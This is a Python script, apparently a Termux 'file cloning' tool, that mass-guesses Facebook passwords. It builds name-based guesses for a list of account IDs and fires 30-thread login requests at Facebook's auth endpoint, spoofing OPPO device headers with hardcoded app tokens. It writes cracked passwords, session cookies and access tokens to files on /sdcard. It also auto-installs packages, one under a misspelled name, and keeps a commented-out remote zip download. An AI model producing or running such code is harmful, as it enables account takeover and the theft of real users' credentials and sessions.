import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp
#_________[ INSTALLING REQUESTS ]_____
'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)
if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"
elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:
	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")

'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)
from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

oppo = random.choice(["CNM632", "CPH1114", "CPH1235", "CPH1451", "CPH1615", "CPH1664", "CPH1869", "CPH1929", "CPH1985",
    "CPH2048", "CPH2107", "CPH2238", "CPH2261", "CPH2331", "CPH2332", "CPH2351", "CPH2389", "CPH2451",
    "CPH2491", "CPH2513", "CPH2515", "CPH2519", "CPH2521", "CPH2523", "CPH2525", "CPH2529", "CPH2551",
    "CPH2569", "CPH2579", "CPH2589", "CPH2591", "CPH2643", "CPH3475", "CPH3669", "CPH3682", "CPH3731",
    "CPH3776", "CPH3785", "CPH4125", "CPH4275", "CPH4299", "CPH4395", "CPH4473", "CPH4987", "CPH5286",
    "CPH5841", "CPH5947", "CPH6178", "CPH6244", "CPH6271", "CPH6316", "CPH6519", "CPH6528", "CPH6697",
    "CPH7338", "CPH7364", "CPH7382", "CPH7532", "CPH7577", "CPH7948", "CPH7991", "CPH8153", "CPH8346",
    "CPH8347", "CPH8363", "CPH8393", "CPH8467", "CPH8472", "CPH8534", "CPH8686", "CPH8893", "CPH9177",
    "CPH9226", "CPH9659", "CPH9667", "CPH9716", "CPH9763", "CPH9839", "CPH9929", "Reno 10 5G", "Reno 10X",
    "Reno 10X Zoom", "Reno 2", "Reno 2F", "Reno 2Z", "Reno 3", "Reno 3 5G", "Reno 3 Lite", "Reno 3 Pro",
    "Reno 3A", "Reno 4 4G", "Reno 4 5G", "Reno 4 Lite", "Reno 4 Pro 4G", "Reno 4 Pro 5G", "Reno 4 SE 5G",
    "Reno 4F", "Reno 4Z 5G", "Reno 5", "Reno 5 5G","Reno 5 Lite", "Reno 5 Pro 5G", "Reno 5 Pro Plus 5G", "Reno 5A", "Reno 5F", "Reno 5G", "Reno 5K", "Reno 5K 5G",
    "Reno 5Z", "Reno 6", "Reno 6 Pro", "Reno 6 Pro 5G", "Reno 6 Pro Plus", "Reno 6 Z 5G", "Reno 7", "Reno 7 Pro",
    "Reno 7 SE", "Reno 7A", "Reno 7Z", "Reno 8", "Reno 8 Pro", "Reno 8 Pro+", "Reno 8 Z", "Reno 8T", "Reno 9",
    "Reno 9 Pro", "Reno 9 Pro+", "Reno A", "Reno Ace", "Reno Ace 2", "Reno K3", "Reno Z", "Reno2", "Reno5", "Reno8",
    "RX17 Neo"])

def line():
	print(51*'-')
def p(x):
	print(x)


id = []
ok = []
cp = []
loop = 0
method=[]

SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()

def logo():
	os.system('clear')
	logo = (f'''\033[0;32m
	
 _______  _______  _______  _______ _________
(  ___  )(  ____ \(       )(  ___  )\__   __/
| (   ) || (    \/| () () || (   ) |   ) (   
| (___) || (_____ | || || || (___) |   | |   
|  ___  |(_____  )| |(_)| ||  ___  |   | |   
| (   ) |      ) || |   | || (   ) |   | |   
| )   ( |/\____) || )   ( || )   ( |   | |   
|/     \|\_______)|/     \||/     \|   )_(   
                                            
 
\33[1;97m---------------------------------------------------
 \33[1;97m OWNER     >>    ASMAT
 \33[1;97m GITHUB    >>    HAVEELI PE AJANA
 \33[1;97m TOOL      >>    UNDER TEST
  \33[1;97mVERSION   >>    0.1
\33[1;97m--------------------------------------------------''')

	p(logo)

def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""



bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string


def iAmMethod3Ua():
	android_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it'+'_IT;FBRV/27'+'3474118;FBCR/;FBMF'+'/OP'+'PO;FBBD/OPPO;FB'+'PN/com.facebook.katana;FB'+'DV/'+str(oppo)+';FBSV/10'+';FBBK/1;FBOP/1;FBC'+'A/arm64-v8a:;]"
	ua = "[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it'+'_IT;FBRV/27'+'3474118;FBCR/;FBMF'+'/OP'+'PO;FBBD/OPPO;FB'+'PN/com.facebook.katana;FB'+'DV/'+str(oppo)+';FBSV/10'+';FBBK/1;FBOP/1;FBC'+'A/arm64-v8a:;]"
	return ua
	

nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))

class iAmMain:


	def __init__(self):
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):

		logo()

		p(" [1] File Cloning ")
		p(" [E] Exit Tool ")
		line()

		opt1 = input(" {•} Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.num_menu()
		elif opt1 == "E":exit(" [•] HAVE A NICE DAY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()


	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/File.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()

	def method_select(self,id):
		logo()
		p(" [1] Method (Old & New) ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("iii")
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should Be Under 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Password Example : First Last, First123, Last123, First786 ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p(" Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):

		line()
		p(" [•] Cloning Has Been Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()
		
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}

				headers = {'User-Agent': iAmMethod3Ua(),

'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ASMAT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ASMAT_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
		self.iAmPasswordManager()
if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
